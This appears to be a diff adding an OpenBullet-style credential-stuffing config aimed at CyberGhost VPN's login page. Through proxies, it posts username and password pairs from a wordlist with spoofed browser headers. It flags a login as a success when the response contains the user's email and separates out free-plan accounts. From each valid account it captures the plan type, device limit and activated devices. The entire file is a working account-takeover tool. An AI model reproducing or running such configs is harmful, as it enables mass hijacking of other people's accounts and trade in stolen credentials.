@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Cyberghost",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-26T03:42:11.2720049+01:00",
+  "AdditionalInfo": "",
+  "Author": "Pestilence",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.cyberghostvpn.com/shop/login" AutoRedirect=FALSE 
+  CONTENT "_method=POST&username=<USER>&password=<PASS>&footerForm=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.cyberghostvpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 58" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://www.cyberghostvpn.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://www.cyberghostvpn.com/en_US/buy/cyberghost-vpn-4?media_source=inhouse_affiliates&lp=pro_homepage&transaction_id=10245452bb77eeb7825735951a56f0&affiliate=mentorvpn&offer_id=265&ad=&coupon=3yEuDo&conversionpoint=5&channel=External+LPs&affiliate_google_clientid=154539482.1566770812" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"user_email\"" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" EqualTo "\"\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"plan_type\":\"free\"}" 
+
+PARSE "<SOURCE>" LR "\"plan_type\":\"" "\"}" -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "\"max_devices\":" "," -> CAP "Max Devices" 
+
+PARSE "<SOURCE>" LR "\"activateddevices\":\"" "\"" -> CAP "Activated Devices" 
+
